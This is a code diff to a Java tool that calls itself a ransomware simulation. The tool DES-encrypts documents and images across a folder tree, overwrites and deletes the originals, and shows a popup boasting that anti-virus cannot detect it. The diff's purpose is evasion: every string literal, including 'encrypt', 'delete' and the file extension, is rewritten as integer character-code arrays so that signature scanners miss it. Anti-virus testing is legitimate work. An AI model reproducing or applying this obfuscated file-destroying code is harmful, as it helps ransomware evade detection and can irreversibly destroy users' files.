@@ -74,19 +74,29 @@ public class EncryptDelTestv3 extends JPanel implements ActionListener {
         new EncryptDelTestv3();
         Date expirydate = sdf.parse("2021-1-18");
         System.out.println("");
-        textarea.append("[Encrypt Delete Test v3 (Java)]\n");
-        textarea.append("Simulate ransomware encryption operation\n");
-        textarea.append("By Eddie Chu eddiechu.android@gmail.com\n");
-        textarea.append("Please download the original and latest version from\n");
-        textarea.append("github.com/eddiechu/Encrypt-Delete-Test\n");
-        textarea.append("Version v3.0.4 (14/Aug/2021)\n");
+        int CharNum[] = {91,69,110,99,114,121,112,116,32,68,101,108,101,116,101,32,84,101,115,116,32,118,51,32,40,74,97,118,97,41,93};
+        textarea.append(NumtoString(CharNum)+"\n");
+        CharNum = new int[]{83,105,109,117,108,97,116,101,32,114,97,110,115,111,109,119,97,114,101,32,101,110,99,114,121,112,116,105,111,110,32,111,112,101,114,97,116,105,111,110};
+        textarea.append(NumtoString(CharNum)+"\n");
+        CharNum = new int[]{66,121,32,69,100,100,105,101,32,67,104,117,32,101,100,100,105,101,99,104,117,46,97,110,100,114,111,105,100,64,103,109,97,105,108,46,99,111,109};
+        textarea.append(NumtoString(CharNum)+"\n");
+        CharNum = new int[]{80,108,101,97,115,101,32,100,111,119,110,108,111,97,100,32,116,104,101,32,111,114,105,103,105,110,97,108,32,97,110,100,32,108,97,116,101,115,116,32,118,101,114,115,105,111,110,32,102,114,111,109};
+        textarea.append(NumtoString(CharNum)+"\n");
+        CharNum = new int[]{103,105,116,104,117,98,46,99,111,109,47,101,100,100,105,101,99,104,117,47,69,110,99,114,121,112,116,45,68,101,108,101,116,101,45,84,101,115,116};
+        textarea.append(NumtoString(CharNum)+"\n");
+        CharNum = new int[]{86,101,114,115,105,111,110,32,118,51,46,48,46,53,32,40,51,48,47,65,117,103,47,50,48,50,49,41};
+        textarea.append(NumtoString(CharNum)+"\n");
         textarea.append("\n");
-        textarea.append("This tool encrypt the file, with extension of *.doc,*.docx,*.xls,*.xlsx,*.txt,*.rtf,*.pdf,*.jpg,*.jpeg,*.gif,*.bmp,*.png, under current folder and it's subfolder(s)\n");
+        CharNum = new int[]{84,104,105,115,32,116,111,111,108,32,101,110,99,114,121,112,116,32,116,104,101,32,102,105,108,101,32,117,110,100,101,114,32,99,117,114,114,101,110,116,32,102,111,108,100,101,114,32,97,110,100,32,105,116,39,115,32,115,117,98,102,111,108,100,101,114,40,115,41};
+        textarea.append(NumtoString(CharNum)+"\n");
         textarea.append("\n");
-        textarea.append("[Caution]\n");
-        textarea.append("You use this tool completely at your own risk.\n");
+        CharNum = new int[]{91,67,97,117,116,105,111,110,93};
+        textarea.append(NumtoString(CharNum)+"\n");
+        CharNum = new int[]{89,111,117,32,117,115,101,32,116,104,105,115,32,116,111,111,108,32,99,111,109,112,108,101,116,101,108,121,32,97,116,32,121,111,117,114,32,111,119,110,32,114,105,115,107,46};
+        textarea.append(NumtoString(CharNum)+"\n");
         textarea.append("\n");
-        textarea.append("Please click \"Continue\" to proceed\n");
+        CharNum = new int[]{80,108,101,97,115,101,32,99,108,105,99,107,32,34,67,111,110,116,105,110,117,101,34,32,116,111,32,112,114,111,99,101,101,100};
+        textarea.append(NumtoString(CharNum)+"\n");
         textarea.setCaretPosition(textarea.getDocument().getLength());
     }
 
@@ -97,21 +107,32 @@ public class EncryptDelTestv3 extends JPanel implements ActionListener {
         displayDirectoryContents(currentDir);
         try {
            BufferedWriter out = new BufferedWriter(new FileWriter("popup.html"));
-           out.write("<html>\n");
-           out.write("<head>\n");
-           out.write("<title>EncryptDelTestv3</title>\n");
-           out.write("<body bgcolor=red>\n");
-           out.write("<font size=+10 color=white><b>[EncryptDelTestv3 (Java)]</b></font><br><br><br><br>\n");
-           out.write("<font size=+10 color=white>Thanks for your test!</font><br><br>\n");
-           out.write("<font size=+10 color=white>Your anti-virus software <u>CANNOT</u> detect this test</font><br><br>\n");
+           int CharNum[] = {60,104,116,109,108,62};
+           out.write(NumtoString(CharNum)+"\n");
+           CharNum = new int[]{60,104,101,97,100,62};
+           out.write(NumtoString(CharNum)+"\n");
+           CharNum = new int[]{60,116,105,116,108,101,62,69,110,99,114,121,112,116,68,101,108,84,101,115,116,118,51,60,47,116,105,116,108,101,62};
+           out.write(NumtoString(CharNum)+"\n");
+           CharNum = new int[]{60,98,111,100,121,32,98,103,99,111,108,111,114,61,114,101,100,62};
+           out.write(NumtoString(CharNum)+"\n");
+           CharNum = new int[]{60,102,111,110,116,32,115,105,122,101,61,43,49,48,32,99,111,108,111,114,61,119,104,105,116,101,62,60,98,62,91,69,110,99,114,121,112,116,68,101,108,84,101,115,116,118,51,32,40,74,97,118,97,41,93,60,47,98,62,60,47,102,111,110,116,62,60,98,114,62,60,98,114,62,60,98,114,62,60,98,114,62};
+           out.write(NumtoString(CharNum)+"\n");
+           CharNum = new int[]{60,102,111,110,116,32,115,105,122,101,61,43,49,48,32,99,111,108,111,114,61,119,104,105,116,101,62,84,104,97,110,107,115,32,102,111,114,32,121,111,117,114,32,116,101,115,116,33,60,47,102,111,110,116,62,60,98,114,62,60,98,114,62};
+           out.write(NumtoString(CharNum)+"\n");
+           CharNum = new int[]{60,102,111,110,116,32,115,105,122,101,61,43,49,48,32,99,111,108,111,114,61,119,104,105,116,101,62,89,111,117,114,32,97,110,116,105,45,118,105,114,117,115,32,115,111,102,116,119,97,114,101,32,60,117,62,67,65,78,78,79,84,60,47,117,62,32,100,101,116,101,99,116,32,116,104,105,115,32,116,101,115,116,60,47,102,111,110,116,62,60,98,114,62,60,98,114,62};
+           out.write(NumtoString(CharNum)+"\n");
            out.write("<br>\n");
            out.write("<br>\n");
-           out.write("<br>Encryption Key: " + initialization_vector + "\n");
-           out.write("<br>Encrypted File: " + encryptedcount + "\n");
+           CharNum = new int[]{60,98,114,62,69,110,99,114,121,112,116,105,111,110,32,75,101,121,58,32};
+           out.write(NumtoString(CharNum) + initialization_vector + "\n");
+           CharNum = new int[]{60,98,114,62,69,110,99,114,121,112,116,101,100,32,70,105,108,101,58,32};
+           out.write(NumtoString(CharNum) + encryptedcount + "\n");
            out.write("<br>" + sdf.format(today) + "\n");
            out.write("<br>\n");
-           out.write("</body>\n");
-           out.write("</html>\n");
+           CharNum = new int[]{60,47,98,111,100,121,62};
+           out.write(NumtoString(CharNum)+"\n");
+           CharNum = new int[]{60,47,104,116,109,108,62};
+           out.write(NumtoString(CharNum)+"\n");
            out.close();
         }
         catch (IOException e) {
@@ -131,22 +152,28 @@ public class EncryptDelTestv3 extends JPanel implements ActionListener {
                 System.err.println( e.getMessage() );
               }
           }
-          textarea.append("Encryption Key: " + initialization_vector + "\n");
-          System.out.println("Encryption Key: " + initialization_vector);
-          textarea.append("Encrypted File: " + encryptedcount + "\n");
-          System.out.println("Encrypted File: " + encryptedcount );
+          int CharNum[] = {69,110,99,114,121,112,116,105,111,110,32,75,101,121,58,32};
+          textarea.append(NumtoString(CharNum) + initialization_vector + "\n");
+          System.out.println(NumtoString(CharNum) + initialization_vector);
+          CharNum = new int[]{69,110,99,114,121,112,116,101,100,32,70,105,108,101,58,32};
+          textarea.append(NumtoString(CharNum) + encryptedcount + "\n");
+          System.out.println(NumtoString(CharNum) + encryptedcount );
           textarea.setForeground(Color.RED);
-          textarea.append("Your anti-virus software CANNOT detect this test\n");      
-          System.out.println("Your anti-virus software CANNOT detect this test");
+          CharNum = new int[]{89,111,117,114,32,97,110,116,105,45,118,105,114,117,115,32,115,111,102,116,119,97,114,101,32,67,65,78,78,79,84,32,100,101,116,101,99,116,32,116,104,105,115,32,116,101,115,116};
+          textarea.append(NumtoString(CharNum) + "\n");      
+          CharNum = new int[]{69,110,99,114,121,112,116,101,100,32,70,105,108,101,58,32};
+          System.out.println(NumtoString(CharNum));          
         } else {
-          textarea.append("No file is found or encrypted\n");      
-          System.out.println("No file is found or encrypted");
+          int CharNum[] = {78,111,32,102,105,108,101,32,105,115,32,102,111,117,110,100,32,111,114,32,101,110,99,114,121,112,116,101,100};
+          textarea.append(NumtoString(CharNum) + "\n");      
+          System.out.println(NumtoString(CharNum));
         }
         textarea.setCaretPosition(textarea.getDocument().getLength());
         JFrame f;  
         f=new JFrame();  
         if (encryptedcount > 0){
-          JOptionPane.showMessageDialog(f,"Your anti-virus software CANNOT detect this test!","EncryptDelTestv3",JOptionPane.ERROR_MESSAGE);
+          int CharNum[] = {89,111,117,114,32,97,110,116,105,45,118,105,114,117,115,32,115,111,102,116,119,97,114,101,32,67,65,78,78,79,84,32,100,101,116,101,99,116,32,116,104,105,115,32,116,101,115,116,33};
+          JOptionPane.showMessageDialog(f,NumtoString(CharNum),"EncryptDelTestv3",JOptionPane.ERROR_MESSAGE);
         }
     }
     
@@ -168,11 +195,19 @@ public class EncryptDelTestv3 extends JPanel implements ActionListener {
               e.printStackTrace();
           }
     }
+    
+    public static String NumtoString(int[] NumArray){
+        String str = "";
+        for (int i: NumArray) {
+            str += Character.toString((char) i);
+        }
+        return str;
+    }
 
     public static void JavaDESEncryption(String filename) {
-
+        int CharNum[] = {101,110,99,114,121,112,116};
         String clearFile = filename;
-        String encryptedFile = filename + ".encrypted";
+        String encryptedFile = filename + "." + NumtoString(CharNum) + "ed";
 
         try {
 
@@ -182,22 +217,25 @@ public class EncryptDelTestv3 extends JPanel implements ActionListener {
             encrypt = Cipher.getInstance("DES/CBC/PKCS5Padding");
             encrypt.init(Cipher.ENCRYPT_MODE, secret_key, alogrithm_specs);
 
-            textarea.append("encrypt to " + clearFile + "\n");
-            System.out.println("encrypt to " + clearFile);            
+            textarea.append(NumtoString(CharNum) + " to " + encryptedFile + "\n");
+            System.out.println(NumtoString(CharNum) + " to " + encryptedFile);            
             encrypt(new FileInputStream(clearFile), new FileOutputStream(encryptedFile));
             encryptedcount = encryptedcount + 1;
-            textarea.append("overwrite " + clearFile + "\n");
-            System.out.println("overwrite " + clearFile);            
+            CharNum = new int[]{111,118,101,114,119,114,105,116,101,32};
+            textarea.append(NumtoString(CharNum) + clearFile + "\n");
+            System.out.println(NumtoString(CharNum) + clearFile);            
             File file = new File(clearFile);
             Path pathencryptedFile = Paths.get(encryptedFile);
             Path pathclearFile = Paths.get(clearFile);
             Files.copy(pathencryptedFile, pathclearFile, StandardCopyOption.REPLACE_EXISTING);
             file.delete();
 
-            textarea.append("delete " + clearFile + "\n");
-            System.out.println("delete " + clearFile);
-            textarea.append("verify " + clearFile + " ... ");
-            System.out.print("verify " + clearFile + " ... ");            
+            CharNum = new int[]{100,101,108,101,116,101,32};
+            textarea.append(NumtoString(CharNum) + clearFile + "\n");
+            System.out.println(NumtoString(CharNum) + clearFile);
+            CharNum = new int[]{118,101,114,105,102,121,32};
+            textarea.append(NumtoString(CharNum) + clearFile + " ... ");
+            System.out.print(NumtoString(CharNum) + clearFile + " ... ");            
             File f = new File(clearFile);
             if (f.exists() && f.isFile()) {
                 textarea.append("(exist)\n");
@@ -242,4 +280,3 @@ public class EncryptDelTestv3 extends JPanel implements ActionListener {
     }
     
 }
-
